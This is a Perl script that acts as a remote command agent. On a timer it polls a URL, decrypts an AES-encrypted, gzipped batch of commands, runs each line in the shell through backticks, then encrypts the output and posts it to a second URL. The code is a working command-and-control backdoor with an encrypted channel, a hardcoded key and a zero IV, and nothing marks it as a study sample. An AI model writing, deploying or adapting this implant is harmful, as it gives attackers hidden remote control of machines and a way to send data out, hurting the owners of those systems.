use 5.018;

use lib qw(extlib/lib/perl5);
use lib qw(/home/void/hs/misc/extlib/lib/perl5);
use lib qw(/home/void/stock/extlib/lib/perl5);

use LWP::UserAgent;
use Try::Tiny;

use Crypt::CBC;
use Crypt::Cipher::AES;
use MIME::Base64;
use Digest::MD5 qw(md5);

use IO::Compress::Gzip qw(gzip $GzipError);
use IO::Uncompress::Gunzip qw(gunzip $GunzipError);

use constant DEFAULT_INTERVAL => 2 * 60 * 60;

my $interrupt = 0;
my $interval = DEFAULT_INTERVAL;
my $get_url = 'http://127.0.0.1:3000/abcde';
my $post_url = 'http://127.0.0.1:3000/fghij';

my $key = md5('random key');

$SIG{INT} = sub { $interrupt = 1 };

while (!$interrupt)
{
	try
	{
		do_hs();
	}
	catch
	{
		logger($_);
	};
	sleep ($interval);
}

sub do_hs
{
	my $ua = LWP::UserAgent->new;
	$ua->timeout(10);
	#$ua->add_handler("request_send",  sub { shift->dump; return });
	#$ua->add_handler("response_done", sub { shift->dump; return });
	#$ua->env_proxy;

	my $response = $ua->get($get_url);

	my $res;
	if ($response->is_success)
	{
		my $content = $response->decoded_content;
		return if ($content eq '');

		#my $cbc = Crypt::CBC->new(-cipher => 'Cipher::AES', -key => $key, -salt => 1);
		my $cbc = Crypt::CBC->new(-cipher => 'Cipher::AES',
			-key => $key,
			-iv => pack('C*', map {0x00} 1..16),
			-header => 'none',
			-padding => 'standard',
			-keysize => 16,
			-literal_key => 1);
		$content = $cbc->decrypt(decode_base64($content));
		my $gunzipped;
		gunzip \$content => \$gunzipped or die "gunzip failed: $GunzipError\n";
		open (my $fh, "<", \$gunzipped);
		for my $l (<$fh>)
		{
			chomp($l);

			$res .= "==========\n";
			$res .= "$l\n";
			$res .= "----------\n";
			if ($l =~ m/^s:interval *= *(\d+)/)
			{
				$interval = $1;
				$res .= "set interval to $interval\n";
			}
			else
			{
				$res .= `$l`;
			}
			$res .= "==========\n";
		}

		my $gzipped;
		gzip \$res => \$gzipped or die "gzip failed: $GzipError\n";
		$res = encode_base64($cbc->encrypt($gzipped), '');
		$ua->post($post_url, {data => $res});
	}
}

sub logger
{
	say @_;
}
